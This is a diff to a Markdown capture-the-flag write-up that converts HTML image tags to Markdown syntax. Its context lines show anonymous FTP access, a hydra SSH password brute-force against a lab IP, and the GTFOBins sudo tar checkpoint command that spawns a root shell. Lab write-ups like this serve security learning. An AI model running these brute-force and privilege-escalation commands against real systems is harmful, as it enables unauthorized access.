@@ -41,9 +41,7 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 - FTP login success: **anonymous login**
 
-<p align="center">
-  <img src="assets/img-1.png" width="600"/>
-</p>
+![](assets/img-1.png)
 
 - Get Specific File To Your Machine:
 
@@ -51,13 +49,9 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 mget file_name
 ```
 
-<p align="center">
-  <img src="assets/img-2.png" width="600"/>
-</p>
+![](assets/img-2.png)
 
-<p align="center">
-  <img src="assets/img-3.png" width="600"/>
-</p>
+![](assets/img-3.png)
 
 ---
 
@@ -83,9 +77,7 @@ cat task.txt
 hydra -l lin -P lock.txt ssh://10.10.187.164
 ```
 
-<p align="center">
-  <img src="assets/img-4.png" width="600"/>
-</p>
+![](assets/img-4.png)
 
 ---
 
@@ -95,22 +87,14 @@ hydra -l lin -P lock.txt ssh://10.10.187.164
 sudo -l
 ```
 
-<p align="center">
-  <img src="assets/img-5.png" width="600"/>
-</p>
+![](assets/img-5.png)
 
 - Search for `tar` Exactly `sudo` in `gtfobins`:
 
-<p align="center">
-  <img src="assets/img-6.png" width="600"/>
-</p>
+![](assets/img-6.png)
 
 ```bash
 sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ```
 
-<p align="center">
-  <img src="assets/img-7.png" width="600"/>
-</p>
-
-
+![](assets/img-7.png)
